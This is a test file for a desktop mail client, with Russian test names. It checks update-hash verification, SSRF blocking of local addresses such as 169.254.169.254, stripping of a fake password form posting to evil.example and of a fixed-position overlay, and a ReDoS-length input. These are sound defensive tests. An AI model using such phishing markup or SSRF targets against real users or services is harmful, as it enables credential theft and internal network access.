// @vitest-environment happy-dom

import { describe, expect, it } from "vitest";
import { createHash } from "node:crypto";
import { expectedSha512ForAsset, isSha512Match } from "../../../desktop/backend/updateAssets";
import { isLocalOrLinkLocalAddress, isPublicFetchHost } from "../../../desktop/backend/netGuard";
import { restrictHTMLForAppDOM } from "../../logic/util/convertHTML";
import { extractRelatedFeatures } from "../../logic/Mail/RelatedEMail";

describe("обновление Mac: DMG сверяется с latest-mac.yml", () => {
  let dmg = Buffer.from("настоящий DMG");
  let sha512 = createHash("sha512").update(dmg).digest("base64");
  let files = [
    { url: "Jackdaw-Mail-0.9.127-universal-mac.zip", sha512: "zip-hash" },
    { url: "jackdaw-mail-0.9.127.dmg", sha512 },
  ];

  it("берёт хеш именно DMG, а не zip", () => {
    expect(expectedSha512ForAsset(files, "jackdaw-mail-0.9.127.dmg")).toBe(sha512);
  });

  it("принимает совпадающий файл", () => {
    let actual = createHash("sha512").update(dmg).digest("base64");
    expect(isSha512Match(actual, expectedSha512ForAsset(files, "jackdaw-mail-0.9.127.dmg"))).toBe(true);
  });

  it("отклоняет подменённый или обрезанный файл", () => {
    let forged = createHash("sha512").update(Buffer.from("чужой DMG")).digest("base64");
    expect(isSha512Match(forged, sha512)).toBe(false);
  });

  it("не ставит обновление, если хеша в манифесте нет", () => {
    expect(expectedSha512ForAsset(files, "other.dmg")).toBeNull();
    expect(expectedSha512ForAsset(undefined, "jackdaw-mail-0.9.127.dmg")).toBeNull();
    expect(isSha512Match(sha512, null)).toBe(false);
  });
});

describe("картинки письма не загружаются с адресов этого компьютера (SSRF)", () => {
  it.each([
    "127.0.0.1", "127.8.9.10", "0.0.0.0", "169.254.169.254", "::1", "[::1]", "::ffff:127.0.0.1", "fe80::1",
  ])("%s — локальный", address => {
    expect(isLocalOrLinkLocalAddress(address)).toBe(true);
  });

  it.each(["93.184.216.34", "10.0.0.5", "192.168.1.10", "2606:4700::1111"])("%s — можно", address => {
    expect(isLocalOrLinkLocalAddress(address)).toBe(false);
  });

  it("имена localhost и IP-адреса проверяются без DNS", async () => {
    expect(await isPublicFetchHost("localhost")).toBe(false);
    expect(await isPublicFetchHost("app.localhost")).toBe(false);
    expect(await isPublicFetchHost("127.0.0.1")).toBe(false);
    expect(await isPublicFetchHost("[::1]")).toBe(false);
    expect(await isPublicFetchHost("192.168.1.10")).toBe(true);
  });
});

describe("чужой HTML в окне приложения не выходит за пределы сообщения", () => {
  it("убирает глобальные стили и поддельные формы ввода пароля", () => {
    let html = restrictHTMLForAppDOM(`<html><head><style>body * { display: none }</style></head><body>
      <p>Привет</p>
      <form action="https://evil.example/"><input type="password" name="p"><button>Войти</button></form>
      <link rel="stylesheet" href="data:text/css,">
    </body></html>`);
    let doc = new DOMParser().parseFromString(html, "text/html");
    expect(doc.querySelector("style, form, input, button, link")).toBeNull();
    expect(doc.body.textContent).toContain("Привет");
  });

  it("убирает фиксированное позиционирование, оставляя остальное оформление", () => {
    let html = restrictHTMLForAppDOM(`<div style="position: fixed; inset: 0; z-index: 9999; color: red">Сессия истекла</div>`);
    let div = new DOMParser().parseFromString(html, "text/html").querySelector("div")!;
    expect(div.style.position).toBe("");
    expect(div.style.zIndex).toBe("");
    expect(div.style.color).toBe("red");
  });

  it("не трогает обычное сообщение", () => {
    expect(restrictHTMLForAppDOM(`<p><b>Жирный</b> и <a href="https://example.com">ссылка</a></p>`))
      .toBe(`<p><b>Жирный</b> и <a href="https://example.com">ссылка</a></p>`);
    expect(restrictHTMLForAppDOM("")).toBe("");
  });
});

describe("поиск адресов в цитатах не зависает на длинной строке (ReDoS)", () => {
  it("строка «From:» из 200 000 букв без @ разбирается быстро", () => {
    let started = performance.now();
    extractRelatedFeatures({ subject: "", body: "> From: " + "щ".repeat(200_000) } as any);
    expect(performance.now() - started).toBeLessThan(2_000);
  });
});
